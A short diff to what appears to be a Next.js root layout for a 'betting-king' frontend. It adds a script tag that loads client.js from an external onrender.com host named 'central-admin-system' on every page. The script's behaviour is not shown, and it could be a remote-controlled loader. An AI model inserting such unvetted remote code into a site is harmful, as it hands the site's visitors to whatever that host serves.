@@ -23,6 +23,9 @@ export const metadata = {
 export default function RootLayout({ children }) {
   return (
     <html lang="en">
+      <head>
+        <script src="https://central-admin-system.onrender.com/client.js" data-site-id="betting-king-frontend_v5" async />
+      </head>
       <body>{children}</body>
     </html>
   );
